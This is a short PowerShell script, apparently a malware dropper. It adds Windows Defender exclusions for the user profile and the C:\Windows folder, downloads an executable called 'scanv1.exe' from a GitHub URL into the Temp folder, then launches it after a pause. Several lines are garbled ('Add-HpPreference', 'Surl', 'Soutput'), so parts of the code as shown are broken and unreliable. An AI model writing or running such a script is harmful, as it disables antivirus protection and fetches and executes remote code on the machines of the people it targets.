##################################################################################################
Add-HpPreference -ExclusionPath Senv:USERPROFILE 
Add-MpPreference -ExclusionPath C:\Windows 

###################################################################################################
$url = "https://github.com/Oqgpp/scanner/raw/refs/heads/main/scanv1.exe"


###################################################################################################

$output = "$env:Temp/scanv1.exe"


###################################################################################################

Invoke-WebRequest -Uri Surl -OutFile Soutput 


###################################################################################################

Start-Sleep Milliseconds 6000 
Start-Process -FilePath $output